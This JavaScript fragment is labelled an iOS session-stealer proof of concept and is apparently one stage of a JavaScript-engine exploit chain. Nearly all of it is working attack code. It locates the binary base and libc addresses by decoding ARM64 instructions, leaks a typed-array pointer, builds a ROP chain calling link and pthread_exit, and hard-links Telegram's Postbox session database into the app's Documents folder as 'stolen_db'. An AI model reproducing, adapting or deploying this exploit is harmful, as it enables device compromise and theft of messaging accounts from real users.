/* ===== iOS session-stealer PoC: hard-link the Postbox DB into Documents =====
 * link(src, dst) with both paths in UB; then pthread_exit. No DB modification.
 */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('S_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('S_NO_FREE'); return; }
  var LINK = u64(libcFree + 0x296de230n);
  var PEXIT = u64(libcFree + 0x4a21a474n);
  var G_CALL = base + 0x3292cn;
  var G_LOAD = base + 0x172d96cn;
  var G_X0 = base + 0x628a2cn;
  var PIVOT2 = u64(libcFree - 0x66cccfcn);

  /* ---- leak data pointer of a fresh Uint8Array(2048) ---- */
  /* per-run magic: a stale Uint8Array(2048) from an earlier widget run must
     not satisfy the leak scan. */
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  var UB = new Uint8Array(2048);
  for (var i0 = 0; i0 < 2048; i0++) UB[i0] = 0;
  put64_(UB, 0x400, MAG);
  var U = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 2048n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x400n) === MAG) { U = p; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 2048n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x400n) === MAG) { U = p2; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { setres('S_NF D=' + hex(D)); return; }

  var SRC = '/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/telegram-data/account-00000000000000000000/postbox/db/db_sqlite';
  var DST = '/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/stolen_db';
  function a8(x) { return (x + 7) & ~7; }
  var oSrc = 0;
  var oDst = a8(oSrc + SRC.length + 1);
  var oA = a8(oDst + DST.length + 1);
  var oB = oA + 0x40;
  var oBE = oB + 0x40;
  var oEnd = oBE + 0x40;
  for (var z = 0; z < oEnd; z++) UB[z] = 0;
  for (var z2 = 0; z2 < SRC.length; z2++) UB[oSrc + z2] = SRC.charCodeAt(z2) & 0xff;
  for (var z3 = 0; z3 < DST.length; z3++) UB[oDst + z3] = DST.charCodeAt(z3) & 0xff;
  /* struct A: x1 = dst */
  put64_(UB, oA + 0x10, U + BigInt(oDst));
  /* struct B: x0 = src */
  put64_(UB, oB + 0x28, U + BigInt(oSrc));
  /* struct BE: x0 = 0 */

  var T = TRIG;
  if (!T || T.length < 0x200) { setres('S_TRIG'); return; }
  for (var i1 = 0; i1 < 0x200; i1++) T[i1] = 0;
  put64_(T, 0x08, U + BigInt(oB));
  put64_(T, 0x10, G_LOAD);
  put64_(T, 0x18, U + BigInt(oA));
  put64_(T, 0xB8, U + BigInt(oB));
  put64_(T, 0xD0, LINK);
  put64_(T, 0xE0, G_X0);
  put64_(T, 0xE8, U + BigInt(oBE));
  put64_(T, 0x100, PEXIT);
  put64_(T, 0x110, G_X0);
  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  var HUGE = 0xffffffffffffffffn, ZERO = 0n;
  setres('S_RDY ' + hex(U));
  setR(RT_FREE); Rb[0] = G_CALL;
  setR(RT_OPAQUE); Rb[0] = ZERO;
  setR(RT_SIZE); Rb[0] = HUGE;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  T = null;
  try { TRIG = null; } catch (e) { setres('S_EXC'); return; }
  setres('S_AFTER');
